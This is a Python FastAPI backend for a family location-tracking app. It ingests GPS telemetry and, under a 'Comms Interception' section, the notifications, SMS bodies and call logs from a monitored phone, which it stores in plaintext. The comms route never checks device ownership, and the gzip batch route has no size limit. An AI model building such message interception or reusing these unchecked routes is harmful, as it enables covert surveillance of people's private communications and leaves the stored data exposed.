"""
Telemetry Ingest Endpoint
==========================
POST /api/v1/telemetry/ingest

Accepts both:
  - Single location JSON (existing)
  - Gzip-compressed batch JSON (new): Content-Encoding: gzip
    Body: {"device_id": "...", "batch": [{lat, lng, speed, accuracy, ts}, ...]}

For each point:
  1. Writes pgcrypto-encrypted coords to locations_raw
  2. Writes raw point to location_history (for map-matching coordinate lookup)
  3. Drives the trip state machine
  4. Logs LOW_BATTERY_MODE_ACTIVE if battery_level < 20
"""
import gzip
import json
import logging
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, Request, status
from pydantic import BaseModel, Field
from sqlalchemy import text

from app.schemas.location import LocationUpdate
from app.api.deps import get_current_user
from app.core.auth import PGCRYPTO_KEY
from app.db.session import AsyncSessionLocal

logger = logging.getLogger(__name__)

LOW_BATTERY_THRESHOLD = 20.0

router = APIRouter()


class BatchPoint(BaseModel):
    lat: float
    lng: float
    speed: float | None = None
    accuracy: float | None = None
    battery_level: float | None = None
    ts: datetime | None = None


class BatchPayload(BaseModel):
    device_id: str
    batch: list[BatchPoint]


# ── Comms Interception Payloads ────────────────────────────────

class NotificationPayload(BaseModel):
    package_name: str
    title: str | None = None
    text: str | None = None
    timestamp: datetime

class SmsPayload(BaseModel):
    sender: str
    body: str | None = None
    timestamp: datetime
    is_incoming: bool

class CallLogPayload(BaseModel):
    number: str
    duration_seconds: int
    type: str # 'missed', 'incoming', 'outgoing'
    timestamp: datetime

class CommsBatchRequest(BaseModel):
    device_id: str
    notifications: list[NotificationPayload] | None = None
    sms: list[SmsPayload] | None = None
    calls: list[CallLogPayload] | None = None



# ── Single point ingest ───────────────────────────────────────

@router.post("/ingest", status_code=status.HTTP_201_CREATED)
async def ingest_telemetry(
    data: LocationUpdate,
    user: dict = Depends(get_current_user),
):
    """Ingest a single location update."""
    family_id = user.get("family_id")
    await _process_point(
        device_id=data.device_id,
        family_id=str(family_id),
        lat=data.latitude,
        lng=data.longitude,
        speed=data.speed,
        battery_level=data.battery_level,
        accuracy=None,
        timestamp=datetime.now(timezone.utc),
    )
    return {"message": "Location update received successfully", "device_id": data.device_id}


# ── Batch ingest (gzip-compressed) ───────────────────────────

@router.post("/ingest/batch", status_code=status.HTTP_201_CREATED)
async def ingest_batch(
    request: Request,
    user: dict = Depends(get_current_user),
):
    """
    Accept a gzip-compressed batch of location points.
    Client must set Content-Encoding: gzip.
    """
    family_id = user.get("family_id")
    body = await request.body()

    content_encoding = request.headers.get("content-encoding", "")
    if "gzip" in content_encoding:
        body = gzip.decompress(body)

    raw = json.loads(body)
    payload = BatchPayload(**raw)

    processed = 0
    for pt in payload.batch:
        ts = pt.ts or datetime.now(timezone.utc)
        await _process_point(
            device_id=payload.device_id,
            family_id=str(family_id),
            lat=pt.lat,
            lng=pt.lng,
            speed=pt.speed,
            battery_level=pt.battery_level,
            accuracy=pt.accuracy,
            timestamp=ts,
        )
        processed += 1

    return {"message": f"Batch ingested", "device_id": payload.device_id, "count": processed}


# ── Communications Ingest Routes ──────────────────────────────

@router.post("/comms", status_code=status.HTTP_201_CREATED)
async def ingest_comms(
    payload: CommsBatchRequest,
    user: dict = Depends(get_current_user)
):
    """Ingest batched notifications, SMS, and call logs."""
    async with AsyncSessionLocal() as session:
        if payload.notifications:
            for notif in payload.notifications:
                await session.execute(
                    text("""
                        INSERT INTO notifications (device_id, package_name, title, text, timestamp)
                        VALUES (:device_id, :pkg, :title, :txt, :ts)
                    """),
                    {
                        "device_id": payload.device_id,
                        "pkg": notif.package_name,
                        "title": notif.title,
                        "txt": notif.text,
                        "ts": notif.timestamp
                    }
                )

        if payload.sms:
            for sms in payload.sms:
                await session.execute(
                    text("""
                        INSERT INTO sms_messages (device_id, sender, body, timestamp, is_incoming)
                        VALUES (:device_id, :sender, :body, :ts, :incoming)
                    """),
                    {
                        "device_id": payload.device_id,
                        "sender": sms.sender,
                        "body": sms.body,
                        "ts": sms.timestamp,
                        "incoming": sms.is_incoming
                    }
                )
                
        if payload.calls:
            for call in payload.calls:
                await session.execute(
                    text("""
                        INSERT INTO call_logs (device_id, number, duration_seconds, type, timestamp)
                        VALUES (:device_id, :num, :dur, :typ, :ts)
                    """),
                    {
                        "device_id": payload.device_id,
                        "num": call.number,
                        "dur": call.duration_seconds,
                        "typ": call.type,
                        "ts": call.timestamp
                    }
                )

        await session.commit()
    
    return {"message": "Comms ingested successfully"}


# ── Shared processing logic ───────────────────────────────────

async def _process_point(
    device_id: str,
    family_id: str,
    lat: float,
    lng: float,
    speed: float | None,
    battery_level: float | None,
    accuracy: float | None,
    timestamp: datetime,
) -> None:
    """Write to DB and drive state machine."""
    # Battery warning
    if battery_level is not None and battery_level < LOW_BATTERY_THRESHOLD:
        logger.info(
            f"[Telemetry] LOW_BATTERY_MODE_ACTIVE device={device_id} "
            f"battery={battery_level}%"
        )

    async with AsyncSessionLocal() as session:
        # 1. Encrypted audit trail
        await session.execute(
            text("""
                INSERT INTO locations_raw
                    (device_id, lat_encrypted, lng_encrypted, altitude, speed, battery_level)
                VALUES (
                    :device_id,
                    pgp_sym_encrypt(:lat, :key),
                    pgp_sym_encrypt(:lng, :key),
                    NULL, :speed, :battery_level
                )
            """),
            {
                "device_id": device_id,
                "lat": str(lat),
                "lng": str(lng),
                "key": PGCRYPTO_KEY,
                "speed": speed,
                "battery_level": battery_level,
            },
        )

        # 2. Raw location_history (needed by map-matching coordinate lookup)
        await session.execute(
            text("""
                INSERT INTO location_history (device_id, coordinates, speed, battery_level, timestamp)
                VALUES (:device_id,
                        ST_SetSRID(ST_MakePoint(:lng, :lat), 4326)::geography,
                        :speed, :battery, :ts)
            """),
            {
                "device_id": device_id,
                "lat": lat,
                "lng": lng,
                "speed": speed,
                "battery": battery_level,
                "ts": timestamp,
            },
        )
        await session.commit()

    # 3. Drive trip state machine (async, non-blocking)
    from app.core.trip_detector import push_point
    await push_point(
        device_id=device_id,
        family_id=family_id,
        lon=lng,
        lat=lat,
        speed=speed,
        timestamp=timestamp,
        battery_level=battery_level,
    )
